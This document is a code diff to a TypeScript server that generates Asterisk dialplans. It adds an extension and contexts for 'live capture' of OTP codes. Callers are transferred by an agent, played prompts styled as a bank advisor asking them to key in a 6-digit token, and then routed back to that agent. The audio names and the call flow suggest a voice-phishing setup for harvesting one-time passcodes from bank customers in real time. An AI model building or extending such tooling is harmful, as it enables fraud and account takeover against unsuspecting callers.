@@ -659,6 +659,24 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 6666] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Goto(ivr-captura-vivo-6666,s,1)\n\n`;
 
+  dialplanContent += `exten => 666,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 666 ===)\n`;
+  dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Wait(0.2)\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
+  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${LAST_AGENT}" != ""]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/8888)})})})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/6666)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 666] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Goto(ivr-captura-vivo-6666,s,1)\n\n`;
+
   dialplanContent += `; 2a. Extension Dedicada de Captura OTP al Transferir (Extension 7777)\n`;
   dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
@@ -771,6 +789,8 @@ function generateCleanDialplanConf(
   dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777\n`;
   dialplanContent += `; Espera validación del asesor antes de retornar la llamada\n`;
   dialplanContent += `; ========================================================\n`;
+  dialplanContent += `[ivr-otp-live-7777]\n`;
+  dialplanContent += `exten => s,1,Goto(ivr-captura-vivo,s,1)\n\n`;
   dialplanContent += `[ivr-captura-vivo]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
@@ -912,10 +932,12 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
   dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
 
-  dialplanContent += `; ========================================================\\n`;
-  dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 6666\\n`;
-  dialplanContent += `; Mismas funciones que la 7777 pero con soporte de audios propios (6666_intro, etc.)\\n`;
-  dialplanContent += `; ========================================================\\n`;
+  dialplanContent += `; ========================================================\n`;
+  dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 6666\n`;
+  dialplanContent += `; Mismas funciones que la 7777 pero con soporte de audios propios (6666_intro, etc.)\n`;
+  dialplanContent += `; ========================================================\n`;
+  dialplanContent += `[ivr-otp-live-6666]\n`;
+  dialplanContent += `exten => s,1,Goto(ivr-captura-vivo-6666,s,1)\n\n`;
   dialplanContent += `[ivr-captura-vivo-6666]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-6666] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
@@ -933,6 +955,9 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-6666] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Set(AUDIO_6666=\${DB(ivr_vars/6666_prompt)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/6666_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/welcome_6666)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/7777_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/7777_intro)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=custom/solicitar_codigo_otp))\n`;
   dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
@@ -2093,6 +2118,7 @@ const DEFAULT_AUDIO_ASSIGNMENTS: Record<string, string> = {
   agent_transfer: 'custom/conectar_asesor_banco',
   press1_invalid: 'custom/opcion_invalida',
   welcome_7777: 'custom/solicitar_codigo_otp',
+  welcome_6666: 'custom/solicitar_codigo_otp',
   otp_welcome: 'custom/solicitar_codigo_otp',
   otp_wait: 'custom/un_momento_validando_informacion',
   otp_success: 'custom/operacion_bloqueada_exito',
@@ -2185,6 +2211,20 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
       copyToFallback('solicitar_codigo_otp');
       copyToFallback('digite_token_6_digitos');
       activeAudioAssignments.welcome_7777 = cleanPath;
+      break;
+
+    case 'welcome_6666':
+    case '6666':
+    case '666':
+    case 'capture_6666':
+      commands.push(`database put ivr_vars 6666_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 6666_prompt "${cleanPath}"`);
+      commands.push(`database put ivr_vars 666_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 666_prompt "${cleanPath}"`);
+      copyToFallback('bienvenida_6666');
+      copyToFallback('solicitar_codigo_otp');
+      copyToFallback('digite_token_6_digitos');
+      activeAudioAssignments.welcome_6666 = cleanPath;
       break;
 
     case 'otp_welcome':
@@ -2283,6 +2323,15 @@ app.get('/api/asterisk/audio/current-7777', (req, res) => {
   res.json({
     success: true,
     currentAudio: activeAudioAssignments.welcome_7777 || 'custom/solicitar_codigo_otp',
+    defaultAudio: 'custom/solicitar_codigo_otp'
+  });
+});
+
+// Endpoint to retrieve currently assigned audio for extension 6666
+app.get('/api/asterisk/audio/current-6666', (req, res) => {
+  res.json({
+    success: true,
+    currentAudio: activeAudioAssignments.welcome_6666 || 'custom/solicitar_codigo_otp',
     defaultAudio: 'custom/solicitar_codigo_otp'
   });
 });
